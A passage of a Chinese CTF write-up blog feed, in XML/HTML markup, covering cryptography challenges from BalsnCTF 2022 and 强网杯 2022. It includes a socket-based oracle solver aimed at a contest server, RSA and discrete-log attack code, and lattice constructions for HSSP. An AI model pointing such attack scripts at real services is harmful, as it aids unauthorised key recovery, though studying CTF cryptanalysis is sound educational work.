class="string">b&quot;\n&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        body = body + ch</span><br><span class="line">    <span class="keyword">return</span> body</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv</span>():</span></span><br><span class="line">    r = s.recv(<span class="number">1024</span> * <span class="number">3</span>)</span><br><span class="line">    response = r.decode()</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">host = <span class="string">&#x27;39.106.13.71&#x27;</span></span><br><span class="line">port = <span class="number">19050</span></span><br><span class="line">s.connect((host, port))</span><br><span class="line"></span><br><span class="line">print(read_line())</span><br><span class="line">print(read_line())</span><br><span class="line"></span><br><span class="line">ss = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">phi = p - <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1021</span>):  <span class="comment">#  s的比特数减2</span></span><br><span class="line">    recv()</span><br><span class="line">    send(<span class="string">b&#x27;t&#x27;</span>)</span><br><span class="line">    response = read_line()</span><br><span class="line">    e = int(ss, <span class="number">2</span>) * <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">    d = inverse_mod(e, phi)</span><br><span class="line">    g = pow(<span class="number">4</span>, d, p)</span><br><span class="line">    send(str(g).encode())</span><br><span class="line">    response = read_line()</span><br><span class="line">    ss += response.decode()[<span class="number">9</span>]</span><br><span class="line">    <span class="comment"># print(response.decode()[9], ss)</span></span><br><span class="line">    </span><br><span class="line">s_ = int(ss+<span class="string">&#x27;0&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">r = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> bin(s_)[<span class="number">3</span>:]:</span><br><span class="line">r *= <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> _ == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">         r += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> gcd(r, phi) == <span class="number">1</span>:</span><br><span class="line">    print(recv())</span><br><span class="line">    send(<span class="string">b&#x27;t&#x27;</span>)</span><br><span class="line">    response = read_line()</span><br><span class="line">    </span><br><span class="line">    d = inverse_mod(<span class="number">2</span>*r, phi)</span><br><span class="line">    g = pow(<span class="number">4</span>, d, p)</span><br><span class="line">    send(str(g).encode())</span><br><span class="line">    response = read_line()</span><br><span class="line">    print(response)</span><br><span class="line"></span><br><span class="line">s_ = int(ss+<span class="string">&#x27;1&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">r = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> bin(s_)[<span class="number">3</span>:]:</span><br><span class="line">r *= <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> _ == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">         r += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> gcd(r, phi) == <span class="number">1</span>:</span><br><span class="line">    print(recv())</span><br><span class="line">    send(<span class="string">b&#x27;t&#x27;</span>)</span><br><span class="line">    response = read_line()</span><br><span class="line">    d = inverse_mod(r, phi)</span><br><span class="line">    g = pow(<span class="number">4</span>, d, p)</span><br><span class="line">    send(str(g).encode())</span><br><span class="line">    response = read_line()</span><br><span class="line">    print(response)</span><br></pre></td></tr></table></figure><p>事后发现这原来是原题，淦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;h2 id=&quot;unexploitable&quot;&gt;&lt;a href=&quot;#unexploitable&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="crypto" scheme="http://phot0n.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>近期比赛WP</title>
    <link href="http://phot0n.com/2022/09/26/%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9BWP/"/>
    <id>http://phot0n.com/2022/09/26/%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9BWP/</id>
    <published>2022-09-26T02:30:36.000Z</published>
    <updated>2022-10-07T13:55:38.367Z</updated>
    
    <content type="html"><![CDATA[<p>最近攒了挺多比赛不会做的题没复现的，感觉过了一年自己还是那么菜…还是得多写代码多测试帮助理解</p><p>把这半个月打的CTF题复现一下,有些是做出来有些没做 .有意思的题我会详细整理一下</p><h1 id="BalsnCTF-2022"><a href="#BalsnCTF-2022" class="headerlink" title="BalsnCTF 2022"></a>BalsnCTF 2022</h1><h2 id="Yet-another-RSA-with-hint"><a href="#Yet-another-RSA-with-hint" class="headerlink" title="Yet another RSA with hint"></a>Yet another RSA with hint</h2><p>题长这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = pow(bytes_to_long(flag), e, n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">digitsSum</span>(<span class="params">n, base</span>):</span></span><br><span class="line">ret = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> n:</span><br><span class="line">ret += n % base</span><br><span class="line">n //= base</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">hint = [digitsSum(p, i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">200</span>)]</span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line">print(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line">print(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line">print(<span class="string">f&quot;<span class="subst">&#123;hint = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>显然<code>digitsSum(n,base)</code>这个函数是求$n$ 的$base$ 进制数码和,记为$S_b(n)$ ,我们有如下关系式</p><script type="math/tex; mode=display">n\equiv S_b(n) \mod (b-1)</script><p>这样我们根据$p$的数码和利用扩展中国剩余定理组合一下就能得到$p\mod(lcm(2,3,\dots,200))$ 的值,大概还差220比特,剩下的部分利用coppersmith求一下就行了</p><h2 id="VSS"><a href="#VSS" class="headerlink" title="VSS"></a>VSS</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShareScheme</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key: bytes</span>):</span></span><br><span class="line">        <span class="keyword">assert</span> len(key) == <span class="number">128</span></span><br><span class="line">        self.key1 = bytes_to_long(key[:<span class="number">64</span>])</span><br><span class="line">        self.key2 = bytes_to_long(key[<span class="number">64</span>:])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getShare</span>(<span class="params">self</span>):</span></span><br><span class="line">        p = getPrime(<span class="number">512</span>)</span><br><span class="line">        a = random.randint(<span class="number">2</span>, p - <span class="number">1</span>)</span><br><span class="line">        b = random.randint(<span class="number">2</span>, p - <span class="number">1</span>)</span><br><span class="line">        c = random.randint(<span class="number">2</span>, p - <span class="number">1</span>)</span><br><span class="line">        y = (a + self.key1 * b + self.key2 * c) % p</span><br><span class="line">        <span class="keyword">return</span> p, a, b, c, y</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">commit</span>(<span class="params">val: int</span>):</span></span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    g = random.randint(<span class="number">2</span>, p - <span class="number">1</span>)</span><br><span class="line">    print(<span class="string">f&quot;Commitment: <span class="subst">&#123;p&#125;</span> <span class="subst">&#123;g&#125;</span> <span class="subst">&#123;pow(g, val, p)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">128</span>)</span><br><span class="line">ss = ShareScheme(key)</span><br><span class="line"></span><br><span class="line">real_key = sha256(key).digest()[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(real_key, AES.MODE_ECB)</span><br><span class="line">enc_flag = cipher.encrypt(pad(FLAG, <span class="number">16</span>))</span><br><span class="line">print(<span class="string">f&quot;flag = <span class="subst">&#123;enc_flag.hex()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    op = int(input(<span class="string">&quot;Option: &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">        p, a, b, c, y = ss.getShare()</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;a = &#125;</span>&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;b = &#125;</span>&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line">        commit(y)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>一道交互题,挺有意思的,从中也学到挺多的</p><p>题目大意是这样的,我们可以获得若干组如下满足</p><script type="math/tex; mode=display">u_i\equiv a_i+x*b_i+y*c_i\mod p_i\\v_i\equiv g_i^{u_i}\mod q_i</script><p>的数据$(p_i,a_i,b_i,c_i,q_i,g_i)$ </p><p>然后我们的目标就是恢复这个$(x,y)$ </p><p>主要的难点在于这个离散对数问题的求解.我当时一个朴素的想法是如果凑巧$q_i-1$是光滑数,那么我们显然可以通过PH算法求出$u_i$ 倘若我们能恢复两个这样的</p><p>$u_i$ ,那么直接解模方程就能解出$(x,y)$ .但是事实上这样很困难,因为很难生成这样一个光滑数</p><p>但是我们可以发现就算求不出完整的$u_i$,这个DLP形式的方程也能给我们一些信息,换句话说泄露某些比特.当我们收集到的信息足够多的时候,我们就有办法搞出这个$(x,y)$ </p><p>这里有一点借助PH思想的感觉,令</p><script type="math/tex; mode=display">q_i-1 = p_1^{k_1}*p_2^{k_2}*\dots*p_l^{k_l}*S</script><p>(这里的$p_i$ 不是我们得到的模方程的$p_i$ ,就是$q_i-1$的素因子分解) 我们把$q_i-1$部分分解,把较小的素因子(大概小于$2^{24}$ )给提取出来,余下一个$S$ 是大素数因子的乘积</p><p>然后对方程进行变换,得到</p><script type="math/tex; mode=display">v_i^{S} \equiv g_i^{S*u_i} \equiv G_i^{u_i} \mod q_i</script><p>这样我们就知道$G_i$模$q_i$的乘法群的阶为$p_1^{k_1}<em>p_2^{k_2}</em>\dots<em>p_l^{k_l}$ 是个光滑数(准确来说不是阶,而是阶整除这个数).记$\lambda_i = p_1^{k_1}</em>p_2^{k_2}<em>\dots</em>p_l^{k_l}$ 这样我们就能求出$u_i \mod \lambda_i$ ,也就是如下表达式</p><script type="math/tex; mode=display">u_i\equiv a_i+x*b_i+y*c_i\mod p_i \mod \lambda_i \\\rightarrow 0= a_i-u_i +x*b_i+y*c_i-p_i*s_i-\lambda_i*t_i</script><p>然后我们可以构造线性格来把$x,y$给规约出来</p><p>构造如下格子</p><script type="math/tex; mode=display">A =\left[\begin{array}{ccccc:ccc:cccc}a_1-u_1&a_2-u_2&a_3-u_3&\cdots&a_i-u_i&1&&&&\\b_1&b_2&b_3&\cdots&b_i&&1&&&&\\c_i&c_2&c_3&\cdots&c_i&&&1&&&&\\ \hdashline-\lambda_1&&&&&&&&1\\&-\lambda_2&&&&&&&&1\\&&-\lambda_3&&&&&&&&1\\&&&\ddots&&&&&&&&\ddots\\&&&&-\lambda_i&&&&&&&&1\\ \hdashline-p_1&&&\\&-p_2&\\&&-p_3&\\&&&\ddots\\&&&&-p_i\\\end{array}\right]</script><p>令</p><script type="math/tex; mode=display">v = \left[\begin{array} &1&x&y|t_1&t_2\dots&t_i|s_1&s_2&\dots&s_i\end{array}\right]</script><p>可以得到</p><script type="math/tex; mode=display">v*A =\left[\begin{array} &0&0&\dots&0|1&x&y|t_i&t_2&\dots&t_i\end{array}\right]</script><p>为我们想求得的SVP</p><p>最后闲聊几句,由于我不太会用sage里面的<code>discrete_log</code>这类关于求离散对数的函数,不知道如何在已知$G_i$模$q_i$的乘法群的阶为光滑数的情况下快速求解(我试验了一下直接把$G_i$放进去好像还是很慢,不清楚内部实现(x)) 后来想一下自己也不是完全理解PH算法,还有BSGS算法(只会调库┭┮﹏┭┮),于是就自己花时间写了一下,顺便熟悉一下,大概是这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BSGS</span>(<span class="params">g,y,order,p</span>):</span></span><br><span class="line">    m = iroot(order,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> m[<span class="number">1</span>]):</span><br><span class="line">        m = m[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m = m[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    g_inv = invert(g,p)</span><br><span class="line">    ANS = &#123;(y*powmod(g_inv, j, p)%p): j <span class="keyword">for</span> j <span class="keyword">in</span> range(m)&#125;</span><br><span class="line">    gs = powmod(g,m,p)</span><br><span class="line">    tmp  = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="keyword">if</span>(tmp <span class="keyword">in</span> ANS):</span><br><span class="line">            <span class="keyword">return</span> i*m+ANS[tmp]</span><br><span class="line">        tmp = (tmp*gs)%p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fast_prime_list</span>(<span class="params">n</span>):</span> <span class="comment">#埃氏筛获取素数</span></span><br><span class="line">    s = [<span class="literal">True</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n)]</span><br><span class="line">    ans = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n):</span><br><span class="line">        <span class="keyword">if</span>(s[i]):</span><br><span class="line">            ans.append(i)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>*i,n,i):</span><br><span class="line">                s[j] = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">f = open(<span class="string">&quot;prime&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">primelist = eval(f.read())</span><br><span class="line">f.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_part_fact</span>(<span class="params">p</span>):</span> <span class="comment">#get_part_dlp</span></span><br><span class="line">    pp = []</span><br><span class="line">    <span class="keyword">for</span> prime <span class="keyword">in</span> primelist:</span><br><span class="line">        <span class="keyword">if</span>(p%prime==<span class="number">0</span>):</span><br><span class="line">            times = <span class="number">1</span></span><br><span class="line">            p = p//prime</span><br><span class="line">            <span class="keyword">while</span>(p%prime==<span class="number">0</span>):</span><br><span class="line">                p = p//prime</span><br><span class="line">                times+=<span class="number">1</span></span><br><span class="line">            pp.append(prime**times)</span><br><span class="line">    <span class="keyword">return</span> pp,p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crt</span>(<span class="params">rem,mod</span>):</span></span><br><span class="line">    M = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> mod:</span><br><span class="line">        M*=i</span><br><span class="line">    Mm = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> mod:</span><br><span class="line">        Mm.append(M//i)</span><br><span class="line">    Mm_inv = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(Mm)):</span><br><span class="line">        Mm_inv.append(invert(Mm[i],mod[i]))</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(mod)):</span><br><span class="line">        ans=(ans+(Mm[i]*Mm_inv[i]*rem[i]))%M</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">part_DLP</span>(<span class="params">g,y,p</span>):</span> <span class="comment">#get_part_dlp</span></span><br><span class="line">    p_list,s = get_part_fact(p<span class="number">-1</span>)</span><br><span class="line">    ans = []</span><br><span class="line">    <span class="keyword">for</span> pp <span class="keyword">in</span> p_list:</span><br><span class="line">        ys = powmod(y,(p<span class="number">-1</span>)//pp,p)</span><br><span class="line">        gs = powmod(g,(p<span class="number">-1</span>)//pp,p)</span><br><span class="line">        ans.append(BSGS(gs,ys,pp,p))</span><br><span class="line">    <span class="keyword">return</span> crt(ans,p_list)</span><br><span class="line"></span><br><span class="line"><span class="comment">#test</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">10030359293433381220565038851792910292586997578865776049984454625847367785507898175491437340922218643022138600864374969376681516033324932019365049501266797</span></span><br><span class="line">y = <span class="number">5496780498114072665179980513851803104893065180258905269720414193274422483013128888321549170222016387544751305685578896506367790690714036226767122037706232</span></span><br><span class="line">g = <span class="number">5344936366479577828422633940067093571002306215411960589794712947124041075230581692727951962855545803161471317824788568024245777175835445896026057474944535</span></span><br><span class="line">print(part_DLP(g,y,p))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实现的<code>part_DLP</code>就是求得$x \mod p_1^{k_1}<em>p_2^{k_2}</em>\dots*p_l^{k_l}$ 的一个函数</p><p>LLL的代码没写,不过就是那样构造,把求得的$\lambda_i$还有各种参数填进去然后LLL应该就行了</p><p>题解参考的博客:<a href="[BalsnCTF 2022 Writeup :: Mystify (mystiz.hk">参考链接</a>](<a href="https://mystiz.hk/posts/2022/2022-09-05-balsn/">https://mystiz.hk/posts/2022/2022-09-05-balsn/</a>))</p><h1 id="强网杯2022"><a href="#强网杯2022" class="headerlink" title="强网杯2022"></a>强网杯2022</h1><h2 id="Lattice"><a href="#Lattice" class="headerlink" title="Lattice"></a>Lattice</h2><p>说实话以前从来没接触过这个问题,比赛的时候搜到了论文是关于HSSP的,大概读懂了意思但是扩展一下调大范围不知道怎么改，正交格的问题还是第一次接触，这边稍微整理一下</p><p>先从HSSP问题说起，然后再扩展</p><h3 id="HSSP-PROBLEM"><a href="#HSSP-PROBLEM" class="headerlink" title="HSSP PROBLEM"></a>HSSP PROBLEM</h3><p>HSSP主要描述了这样一个问题，给定模数 $q$ ,一个向量$\vec{h} = (h_1,h_2,\dots,h_m) \in \mathbb{Z}^m$ 满足 </p><script type="math/tex; mode=display">\vec{h} \equiv \alpha_1\vec{x_1}+\alpha_2\vec{x_2}+\dots+\alpha_n\vec{x_n} (\mod q)</script><p> 其中$\vec{\alpha} = (\alpha_1,\alpha_2,\dots,\alpha_n) \in \mathbb{Z_q}^n$ ，$\vec{x_i} \in\{0,1\}^m$ 然后让我们恢复出$\vec{\alpha},\vec{x_i}$</p><p>我们已知的量只有向量$\vec{h}$和$q$  。采用的方法是Nguyen-Stern算法，主要分为两步</p><ul><li>从向量$\vec{h}$ 构造出$\overline{\mathcal{L_x}}$ ,其中$\mathcal{L_x}$是向量$\vec{x_i}$ 张成的格</li><li>用BKZ算法从$\overline{\mathcal{L_x}}$  恢复出$\vec{x_i}$ 进而求解出$\vec{\alpha}$ </li></ul><p>首先说一下这个$\overline{\mathcal{L}}$ 是什么，我们假设有个格叫$\mathcal{L}$ ，有定义如下</p><script type="math/tex; mode=display">\mathcal{L}(\mathcal{B}) = \{\sum_{i=1}^{k}v_i\vec{b_i}|v_1,\dots,v_k \in{\mathbb{Z}}\}</script><p>也就是由$\mathcal{B} = \{\vec{b_1},\dots,\vec{b_k}\}$ 张成的格空间，满足下式的称为其的正交格</p><script type="math/tex; mode=display">\mathcal{L}^{\perp} = \{\vec{v} \in \mathbb{Z}^m|\forall\vec{b} \in\mathcal{L},<\vec{v},\vec{b}> =0  \}</script><p>然后$\overline{\mathcal{L}} =(\mathcal{L}^{\perp})^{\perp} $ 称为$\mathcal{L}$ 的<code>completion</code>(我也不知道怎么翻译)。可以知道$\mathcal{L}$为$\overline{\mathcal{L}}$的一个满秩子格。特别的，称格$\mathcal{L}$为完全的(<code>complete</code>)，当$\mathcal{L} = \overline{\mathcal{L}}$</p><h4 id="step-1-orthogonal-lattice-attack"><a href="#step-1-orthogonal-lattice-attack" class="headerlink" title="step 1:orthogonal lattice attack"></a>step 1:orthogonal lattice attack</h4><p>首先构造$\overline{\mathcal{L_x}}$  ，先取与$\vec{h}$模$q$正交的一系列向量</p><script type="math/tex; mode=display">\mathcal{L}_0 = \{\vec{u} \in \mathbb{Z}^m|<\vec{u},\vec{h}>\equiv 0(\mod q)\}</script><p>所以我们带入显然可以知道这个向量是与$\alpha$ 模$q$正交的</p><script type="math/tex; mode=display">\vec{P_u } = (<\vec{u_1},\vec{x_1}>,<\vec{u_2},\vec{x_2}>,\dots,<\vec{u_n},\vec{x_n}>)</script><p>因为</p><script type="math/tex; mode=display"><\vec{u},\vec{h}> \equiv  \alpha_1<\vec{x_1},\vec{u_1}>+\alpha_2<\vec{x_2},\vec{u_2}>+\dots+\alpha_n<\vec{x_n},\vec{u_n} > \equiv 0 (\mod q)</script><p>这样如果$\vec{P_u } $ 比与$\alpha$ 模$q$正交的所有非零向量还要短，那么我们就肯定有$\vec{P_u } = 0$ ,这样的话就有$\vec{u} \in \mathcal{L}_x^{\perp}$  ，那么对$\mathcal{L}_0$ 进行LLL之后就能提取出$\mathcal{L}_x^{\perp}$ 的一组生成基，然后根据这些生成基再计算出$\overline{\mathcal{L}} =(\mathcal{L}^{\perp})^{\perp} $的一组基</p><p>那么问题来了，怎么构造这个$\mathcal{L}_0$ ,才能满足与$\vec{h}$ 模$q$正交 。我们将向量分隔成两部分，记$\vec{u} = (u_1,\vec{u’}),\vec{h} = (h_1,\vec{h’})$ 其中$\vec{u’},\vec{h’} \in{\mathbb{Z}^{m-1}}$ 也就是相当于分隔成一个数值部分和向量部分，那么我们就有</p><script type="math/tex; mode=display">\begin{align}\vec{u} \in \mathcal{L}_0 &\iff u_1*h_1+<\vec{u'},\vec{h'}> \equiv 0 (\mod q)\\&\iff  u_1+<\vec{u'},\vec{h'}>*h_1^{-1}\equiv 0 (\mod q)\end{align}</script><p>当然，前提是逆存在，然后这样构造格子(这里$[q]$应该是模q的意思)</p><script type="math/tex; mode=display">\mathcal{L}_0 =\left[\begin{array}& q&\\-\vec{h'}*h_1^{-1}[q]&\textbf{I}_{m-1} \end{array}\right]</script><p>这是一个$m\times m$的矩阵，每一行为一个$u_i$ 显然对于所有的$u_i$都满足$u_1+&lt;\vec{u’},\vec{h’}&gt;<em>h_1^{-1}\equiv 0 (\mod q)$ 这个条件(第一行$u_1=q,\vec{u’} = 0$显然满足，第二行$u_1$为$-\vec{h’}</em>h_1^{-1}[q]$的第一个分量，而$\vec{u’} = (1,0\dots,0)$正好与$\vec{h’}$一内积就只剩第一个分量。后续同理)</p><p>那么构造的方法就如下代码所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">orthoLattice</span>(<span class="params">b, x0</span>):</span></span><br><span class="line">    m = b.length()</span><br><span class="line">    M = Matrix(ZZ, m, m)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, m):</span><br><span class="line">        M[i, i] = <span class="number">1</span></span><br><span class="line">    M[<span class="number">1</span>:m, <span class="number">0</span>] = -b[<span class="number">1</span>:m] * inverse_mod(b[<span class="number">0</span>], x0)</span><br><span class="line">    M[<span class="number">0</span>, <span class="number">0</span>] = x0</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, m):</span><br><span class="line">        M[i, <span class="number">0</span>] = mod(M[i, <span class="number">0</span>], x0)</span><br><span class="line">    <span class="keyword">return</span> M</span><br></pre></td></tr></table></figure><p>可以证明，对于充分大的$q$ ，我们对$\mathcal{L}_0$进行LLL的结果所得到的前$m-n$个向量$\vec{u_1},\dots,\vec{u}_{m-n}$ 是$\mathcal{L}_x^{\perp}$的一组生成基。证明过程就不贴了，我也没研究(x)</p><p>接下来就是用这组基再计算出$\overline{\mathcal{L}} =(\mathcal{L}^{\perp})^{\perp}$ 这里需要参考另外一篇论文，讲的是给定一个格$\mathcal{L}$ ，通过算法在多项式时间内计算出$\mathcal{L}^{\perp}$ 的一组LLL约减基。带到这里就是给定了$\mathcal{L}_x^{\perp}$  。这里就把算法贴下面了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td 